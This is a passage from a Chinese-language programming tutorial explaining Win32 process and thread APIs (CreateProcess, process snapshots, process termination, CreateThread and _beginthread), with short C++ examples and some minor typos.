hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="literal">false</span>,</span><br><span class="line">dwThreadId);<span class="comment">//这⾥是进程的句柄！（重要）</span></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hProcess);</span><br><span class="line"> <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230511202919646.png" alt="image-20230511202919646"></p><p>句柄表存放在ring0空间，⽽句柄的存在⽬的就是为了避免应⽤层直接修改内核都对象。</p><h1 id="2-和线程相关的API函数"><a href="#2-和线程相关的API函数" class="headerlink" title="2.和线程相关的API函数"></a>2.和线程相关的API函数</h1><h2 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//CreateProcess定义：</span></span><br><span class="line"><span class="function">BOOL <span class="title">CreateProcess</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function"> LPCWSTR pszImageName, <span class="comment">//可执⾏⽂件的名称</span></span></span></span><br><span class="line"><span class="params"><span class="function"> LPCWSTR pszCmdLine, <span class="comment">//传递给模块的参数</span></span></span></span><br><span class="line"><span class="params"><span class="function"> LPSECURITY_ATTRIBUTES psaProcess, <span class="comment">//进程安全性，NULL为默认</span></span></span></span><br><span class="line"><span class="params"><span class="function"> LPSECURITY_ATTRIBUTES psaThread, <span class="comment">//线程安全性，NULL为默认</span></span></span></span><br><span class="line"><span class="params"><span class="function"> BOOL fInheritHandles, <span class="comment">//指定了当前进程中的可继承句柄是否可被新进程继承</span></span></span></span><br><span class="line"><span class="params"><span class="function"> DWORD fdwCreate, <span class="comment">//指定了新进程的优先级及其他创建标志</span></span></span></span><br><span class="line"><span class="params"><span class="function"> LPVOID pvEnvironment, <span class="comment">//指定了新进程使⽤的环境变量</span></span></span></span><br><span class="line"><span class="params"><span class="function"> LPWSTR pszCurDir, <span class="comment">//新进程使⽤的当前⽬录</span></span></span></span><br><span class="line"><span class="params"><span class="function"> LPSTARTUPINFOW psiStartInfo, <span class="comment">//该结构体指定了新进程中主窗⼝位置⼤⼩和标准句柄等</span></span></span></span><br><span class="line"><span class="params"><span class="function"> LPPROCESS_INFORMATION pProcInfo <span class="comment">//[out]返回进程的标志信息，如ID号，句柄等</span></span></span></span><br><span class="line"><span class="params"><span class="function"> )</span></span>;</span><br></pre></td></tr></table></figure><p>CreateProcess函数的最后两个参数 结构体指针 LPSTARTUPINFOW 指向的结构体和 LPPROCESS_INFORMATION结构体。LPPROCESS_INFORMATION指向的结构体用来接收新创建的进程的相关信息</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//STARTUPINFO定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_STARTUPINFO</span> &#123;</span><br><span class="line"> DWORD cb;</span><br><span class="line"> LPTSTR lpReserved; </span><br><span class="line"> LPTSTR lpDesktop; </span><br><span class="line"> LPTSTR lpTitle; </span><br><span class="line"> DWORD dwX; </span><br><span class="line"> DWORD dwY; </span><br><span class="line"> DWORD dwXSize; </span><br><span class="line"> DWORD dwYSize; </span><br><span class="line"> DWORD dwXCountChars; </span><br><span class="line"> DWORD dwYCountChars; </span><br><span class="line"> DWORD dwFillAttribute; </span><br><span class="line"> DWORD dwFlags; </span><br><span class="line"> WORD wShowWindow; </span><br><span class="line"> WORD cbReserved2; </span><br><span class="line"> LPBYTE lpReserved2; </span><br><span class="line"> HANDLE hStdInput; </span><br><span class="line"> HANDLE hStdOutput; </span><br><span class="line"> HANDLE hStdError;</span><br><span class="line">&#125; STARTUPINFO, *LPSTARTUPINFO;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//PROCESS_INFORMATION定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_INFORMATION</span> &#123; </span><br><span class="line">HANDLE hProcess; </span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD dwProcessId; </span><br><span class="line">DWORD dwThreadId;</span><br><span class="line"> &#125; PROCESS_INFORMATION;</span><br></pre></td></tr></table></figure><p>使⽤API函数GetStartipInfo来获取⽗进程创建⾃⼰时使⽤的STARTUPINFO结构。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> LPCWSTR pszImageName = <span class="string">L&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>;</span><br><span class="line"> <span class="type">wchar_t</span> cmdLine[] = <span class="string">L&quot; C:\\Users\ASUS\\Desktop\\123\\ttt.txt&quot;</span>;</span><br><span class="line"> <span class="comment">//注意前两个参数的⽤法，第⼀个参数LPCWSTR类型，表示进程的可执⾏⽂件名字</span></span><br><span class="line"> <span class="comment">//第⼆个参数表示命令⾏参数，引号中*有空格*（注意）将两个参数隔开</span></span><br><span class="line">     <span class="comment">//可以不适⽤第⼀个参数，只使⽤第⼆个参数，则第⼆个参数表示为（中间空格隔开）：</span></span><br><span class="line"> <span class="comment">//wchar_t cmdLine[]=L&quot;C:\\Windows\\System32\\notepad.exe</span></span><br><span class="line">C:\\Users\\z\\Desktop\\ttt.txt<span class="string">&quot;</span></span><br><span class="line"><span class="string"> LPWSTR pszCmdLine = cmdLine;</span></span><br><span class="line"><span class="string"> STARTUPINFOW si = &#123; sizeof(si) &#125;;</span></span><br><span class="line"><span class="string"> si.wShowWindow = TRUE;</span></span><br><span class="line"><span class="string"> PROCESS_INFORMATION pi;</span></span><br><span class="line"><span class="string"> BOOL bCr = CreateProcess(</span></span><br><span class="line"><span class="string"> pszImageName,</span></span><br><span class="line"><span class="string"> pszCmdLine,</span></span><br><span class="line"><span class="string"> NULL,</span></span><br><span class="line"><span class="string"> NULL,</span></span><br><span class="line"><span class="string"> false,</span></span><br><span class="line"><span class="string"> CREATE_SUSPENDED,</span></span><br><span class="line"><span class="string"> NULL,</span></span><br><span class="line"><span class="string"> NULL,</span></span><br><span class="line"><span class="string"> &amp;si,</span></span><br><span class="line"><span class="string"> &amp;pi);</span></span><br><span class="line"><span class="string"> if (bCr)</span></span><br><span class="line"><span class="string"> &#123;</span></span><br><span class="line"><span class="string"> HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE,</span></span><br><span class="line"><span class="string">pi.dwThreadId);</span></span><br><span class="line"><span class="string"> ResumeThread(hThread);</span></span><br><span class="line"><span class="string"> CloseHandle(pi.hProcess);</span></span><br><span class="line"><span class="string"> CloseHandle(pi.hThread);</span></span><br><span class="line"><span class="string"> std::cout &lt;&lt; &quot;</span>新进程的ID号是<span class="string">&quot; &lt;&lt; pi.dwProcessId &lt;&lt; std::endl;</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230511211437296.png" alt="image-20230511211437296"></p><h2 id="遍历进程"><a href="#遍历进程" class="headerlink" title="遍历进程"></a>遍历进程</h2><p>CreateToolhelp32Snapshot：</p><p>CreateToolhelp32Snapshot给当前系统内执⾏的进程拍快照，Process32First函数和Process32Next函数遍历快照表中记录的列表。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//相关API定义</span></span><br><span class="line"><span class="function">HANDLE WINAPI <span class="title">CreateToolhelp32Snapshot</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dwFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD th32ProcessID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">Process32First</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE hSnapshot,</span></span></span><br><span class="line"><span class="params"><span class="function">LPPROCESSENTRY32 lppe <span class="comment">//[out]获取信息的结构体</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">Process32Next</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE hSnapshot,</span></span></span><br><span class="line"><span class="params"><span class="function">LPPROCESSENTRY32 lppe <span class="comment">//[out]获取信息的结构体</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>需要重点关注的是Process32First和Process32Next的第⼆个参数，⽤来获取相关信息的结构体，PROCESSENTRY32结构体定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tagPROCESSENTRY32</span> &#123;</span><br><span class="line"> DWORD dwSize; <span class="comment">//该结构体的⼤⼩</span></span><br><span class="line"> DWORD cntUsage;</span><br><span class="line"> DWORD th32ProcessID;</span><br><span class="line"> DWORD th32DefaultHeapID;</span><br><span class="line"> DWORD th32ModuleID;</span><br><span class="line"> DWORD cntThreads;</span><br><span class="line"> DWORD th32ParentProcessID;</span><br><span class="line"> LONG pcPriClassBase;</span><br><span class="line"> DWORD dwFlags;</span><br><span class="line"> TCHAR szExeFile[MAX_PATH];</span><br><span class="line"> DWORD th32MemoryBase;</span><br><span class="line"> DWORD th32AccessKey;</span><br><span class="line"> &#125; PROCESSENTRY32;</span><br><span class="line"> <span class="keyword">typedef</span> PROCESSENTRY32* PPROCESSENTRY32;</span><br><span class="line"><span class="keyword">typedef</span> PROCESSENTRY32* LPPROCESSENTRY32;</span><br></pre></td></tr></table></figure><p>使用该结构体前第一个参数要先初始化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span> <span class="comment">//快照头⽂件</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PROCESSENTRY32 pe32;</span><br><span class="line">pe32.dwSize = <span class="built_in">sizeof</span>(pe32);</span><br><span class="line"><span class="comment">//给系统内的所有进程拍⼀个快照</span></span><br><span class="line">HANDLE hProcessSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;快照失败！&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//遍历进程快照，显示每个进程的信息</span></span><br><span class="line">BOOL bMore = ::<span class="built_in">Process32First</span>(hProcessSnap, &amp;pe32);</span><br><span class="line"><span class="keyword">while</span> (bMore)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;进程名称:&quot;</span> &lt;&lt; pe32.szExeFile &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;进程ID号:&quot;</span> &lt;&lt; pe32.th32ProcessID &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line">bMore = ::<span class="built_in">Process32Next</span>(hProcessSnap, &amp;pe32);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcessSnap);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230511211801782.png" alt="image-20230511211801782" style="zoom:50%;" /><p>当然快照不仅仅可以用来获取系统进程信息，还可以获取指定进程中的堆，模块等.</p><p>详细还得看文档</p><h2 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h2><p>除了进程中所有线程结束或主线程的⼊⼝函数返回之外，我们还可以通过调⽤函数强⾏终⽌进程，<strong>ExitProcess****终⽌当前进程，</strong>TerminateProcess**可以终⽌其他进程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">ExitProcess</span><span class="params">( UINT uExitCode)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">TerminateProcess</span><span class="params">( HANDLE hProcess, DWORD uExitCode)</span></span>;</span><br></pre></td></tr></table></figure><p>可以很明显的看到两个函数都有⼀个参数uExitCode，该参数⽤来重置退出代码的值，进程中所有线程在没有结束时Exit Code的值都是STILL_ACTIVE，进程结束，进程中的所有线程的Exit Code的值替换成该参数。该值可以通过GetExitCodeThread获取。</p><p><strong>不建议使⽤这两个函数终⽌进程，这两个函数结束进程的时候可能导致内存泄露。</strong></p><h1 id="3-线程操作"><a href="#3-线程操作" class="headerlink" title="3.线程操作"></a>3.线程操作</h1><p>Win32线程控制只有是围绕线程这⼀内核对象的<strong>创建、挂起、恢复、终结</strong>以及<strong>通信</strong>等操作，这些操作都依赖于Win32操作系统提供的⼀组API和具体编译器的C运⾏时库函数。</p><h2 id="beginthread"><a href="#beginthread" class="headerlink" title="_beginthread"></a>_beginthread</h2><ul><li>_beginthread(函数名,栈大小,参数指针)</li><li>Win32 函数中提供了多线程的函数，包括创建线程，管理线程，终止线程，线程同步等接口</li></ul><p>线程函数=》线程开始执行的函数</p><p>DWORD WINAPI ThreadFunc (LPVOID lpvThreadParm )；【 PVIOD 一个普通指针类型】</p><p>线程创建</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">LPDWORD lpThreadId )</span></span>;</span><br></pre></td></tr></table></figure><p>第⼀个参数lpThreadAtt，是⼀个指向SECURITY- ATTRIBUTES结构的指针，该结构制定了线程的安全属性，缺省为 NULL。</p><p>第⼆个参数dwStackSize，是栈的⼤⼩，⼀般设置为0。</p><p>第三个参数lpFun是新线程开始执⾏时，线程函数的⼊⼝地址。它必须是将要被新线程执行的函数地址，<strong>不能</strong>为NULL。</p><p>第四个参数lpParameter，是线程函数定义的参数。可以通过这个参数传送值，包括指针或者NULL</p><p>第五个参数dwCreationFlags，控制线程创建的附加标志，可以设置两种值。</p><ul><li>0表示线程在被创建后就会⽴即开始执⾏；</li><li>如果该参数为CREATE_SUSPENDED，则系统产⽣线程后，该线程处于挂起状态，并不⻢上执⾏，直⾄函数ResumeThread被调⽤；</li></ul><p>第六个参数lpThreadID，为指向32位变量的指针，该参数接受所创建线程的ID号。如果创建成功则返回线程的ID，否则返回NULL。</p><p>CreateThread不会执⾏C运⾏时数据块， 因此在C运⾏时库的应⽤程序中，不能使⽤CreateThread创建线程，微软提供了另外的创建线程的⽅法：创建线程⽤process.h头⽂件中声明的C执⾏时期链接库函数_beginthread。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hThread = _beginthread (</span><br><span class="line"><span class="built_in">void</span>( __cdecl *start_address )( <span class="type">void</span> * ),</span><br><span class="line"><span class="type">unsigned</span> stack_size, <span class="type">void</span> *arglist) ;</span><br><span class="line">线程函数的语法：</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">ThreadProc</span> <span class="params">(<span class="type">void</span> * pParam)</span> </span>;</span><br></pre></td></tr></table></figure><p>在windows平台下可以通过windows的线程库来实现多线程编程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//使⽤_beginthread函数创建线程的例⼦。</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ThreadFunc1</span><span class="params">(PVOID param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot; This is ThreadFunc1 &quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ThreadFunc2</span><span class="params">(PVOID param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot; This is ThreadFunc2 &quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//可以多次执⾏本程序，查看两个线程函数执⾏的顺序。</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    _beginthread(ThreadFunc1, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    _beginthread(ThreadFunc2, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;end&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230511215417072.png" alt="image-20230511215417072" style="zoom: 50%;" /><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230511215502138.png" alt="image-20230511215502138" style="zoom:50%;" /><p>这里可以看到我们开了2个线程，两个进程同时在我们程序中运行，所以一般要优化程序运行速度就会开多个线程去跑这个程序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建线程</span></span><br><span class="line"><span class="comment">//返回值:线程句柄</span></span><br><span class="line"><span class="function">HANDLE WINAPI <span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"> _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function"> _In_ SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function"> _In_ LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function"> _In_opt_ LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function"> _In_ DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function"> _Out_opt_ LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">//挂起线程:</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SuspendThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"> _In_ HANDLE hThread <span class="comment">// 线程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">//恢复线程执⾏</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ResumeThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"> _In_ HANDLE hThread <span class="comment">// 线程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">//内核对象: 如线程,当线程处于运⾏时,是未通知状态,当线程处于停⽌状态时,是已通知状态</span></span><br><span class="line"><span class="comment">//满⾜两个参数任何⼀个都可以继续往下执⾏ timeOut:-1 永远等待</span></span><br><span class="line"><span class="comment">//等待线程执⾏完成 返回值 : WAIT_OBJECT_0(0) :线程已通知 WAIT_TIMEOUT(0x102)</span></span><br><span class="line">:线程超时</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">     _In_ HANDLE hHandle,</span></span></span><br><span class="line"><span class="params"><span class="function"> _In_ DWORD dwMilliseconds</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WaitForMulipleObjects</span><span class="params">(_In_ DWORD nCount,<span class="comment">//对象个数</span></span></span></span><br><span class="line"><span class="params"><span class="function"> _In_ <span class="type">const</span> HANDLE *lpHandles,<span class="comment">//存放多个内核对象的句柄的数组 的指针;</span></span></span></span><br><span class="line"><span class="params"><span class="function"> _In_ BOOL bWaitAll,<span class="comment">//TRUE 为等待全部对象为已通知,FLASE 为只要有⼀个</span></span></span></span><br><span class="line"><span class="params"><span class="function">变为已通知</span></span></span><br><span class="line"><span class="params"><span class="function"> _In_ DWORD dwMilliseconds<span class="comment">//等待时间</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">//退出线程</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ExitThread</span><span class="params">(DWORD exitCode)</span></span>; <span class="comment">//线程内部使⽤</span></span><br><span class="line"> <span class="comment">//return a //正常返回 a为退出码</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">TerminateThread</span><span class="params">(_In_ HANDLE hThread, _In_ DWORD</span></span></span><br><span class="line"><span class="params"><span class="function">exitCode)</span></span>;<span class="comment">//线程外部使⽤,直接终⽌线程,并保留线程堆栈不销毁</span></span><br><span class="line"> <span class="comment">//获取线程退出码</span></span><br><span class="line"><span class="function">BOOL <span class="title">GetExitCodeThread</span><span class="params">(_In_ HANDLE hThread, _Out_ DWORD exitCode)</span><span class="comment">//配合</span></span></span><br><span class="line"><span class="function">WaitForSingleObject 使⽤/</span></span><br><span class="line"><span class="function"> <span class="comment">// 获取挂起线程内部信息</span></span></span><br><span class="line"><span class="function"> DWORD WINAPI <span class="title">SuspendThread</span><span class="params">(_In_ HANDLE hhandle)</span></span>;</span><br><span class="line">CONTEXT context;<span class="comment">//设置要获取的类型</span></span><br><span class="line">context.ContextFlage = CONTEXT_CONTROL;<span class="comment">//有多种</span></span><br><span class="line"> <span 